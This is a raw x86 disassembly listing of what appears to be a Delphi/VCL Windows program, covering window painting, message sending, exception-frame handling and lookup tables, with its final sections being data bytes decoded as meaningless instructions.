mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cdd8
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_43cde0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov edx [ eax + 0x10 ]
mov eax edi
call sub_40408c
pop edi
pop esi
pop ebx
retn
sub_43ce34
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax [ edi + 0x14 ]
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_43a0c0
mov eax [ eax + 0x10 ]
mov edx ebp
call sub_40810c
test eax eax
jne r-xdata
sub_43ce9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_43cebc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
retn
sub_43cee4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_4533bc
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_44cde8
sub_43cf34
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_43cf94
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403458
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x28c ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_43bd90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cf9b
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_43cfa4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x28c ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_43bd90
pop esi
pop ebx
retn
sub_43cfd8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d01c
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_40594c
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_43d01c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43d064
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_43a0c0
mov edx [ eax + 0x10 ]
mov eax edi
call sub_40408c
pop edi
pop esi
pop ebx
retn
sub_43d088
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43d14e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43d058
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_43d064
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404890
mov eax [ ebp - 0x4 ]
call sub_4048b0
mov edi eax
add edi edi
lea eax [ edi + 0x2 ]
push eax
call CoTaskMemAlloc
mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
lea edx [ edi + 0x2 ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_402cbc
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_406ca4
inc ebx
inc [ esi + 0x10 ]
mov ebx 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d155
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404744
retn
sub_43d174
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_43d058
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_43d1a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43d20f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d216
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404aa0
mov eax rw-data
mov edx [ r-xdata ]
call sub_404aa0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43d468
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42e5e0
mov [ esi + 0x5 ] al
call sub_43b3ec
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43dde0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43d4b4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_43d554
call sub_42e420
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43d4e8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43d554
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43d598
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43d4e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43d5e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43d4e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43d634
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43d4e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43d678
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43d4e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43d6c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43d4e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43d728
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4048b0
push eax
mov eax esi
call sub_4048a0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43d4e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43d78c
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43d810
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43d84c
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43d8e8
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43d905 ]
jmp [ eax * 4 + jump_table_43d96e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43dc74
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43ddcf
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43d810
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43d634
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_417298
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43ddfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43de37
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43de3e
retn
mov eax [ rw-data ]
call sub_4032a8
mov eax rw-data
call sub_404038
sub_43de48
xchg esp eax
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
fild [ ebx ]
jpe r-xdata
inc ebx
add [ eax ] dl
add al [ eax ]
add [ esp + ecx * 4 + 0x44 ] ch
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bl
dec ebp
inc ebp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add al dl
sbb eax [ eax + eax - 0x1c ]
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_43e140
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub dl ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
inc ebx
add [ eax - 0x7ffffff ] dl
fild [ ebx ]
int3
sub_43e169
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + eax * 2 + 0x45 ] bl
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
xor [ esp + eax * 2 ] ah
add [ eax ] bl
inc esp
add [ eax + 0x5c0044bc ] cl
mov [ eax + eax - 0x1c ] 0x16
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax ] bl
and [ eax + eax + 0x48 ] eax
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x70 ]
mov ebx 0xc2fc0044
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ eax ] bh
and eax 0xbc540044
inc esp
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_43e5d2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
je r-xdata
inc esp
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax + 0x4f0b002b ] al
or [ bx + di + 0x44 ] bh
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
jo r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
cmp [ ecx + 0x44 ] 0x0
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942e63d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
jpo r-xdata
outsd
ja r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ ecx + ebp * 8 + 0x43 ] dl
jb r-xdata
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
pop edx
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
and [ edx ] al
add [ eax ] al
jo r-xdata
inc esp
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
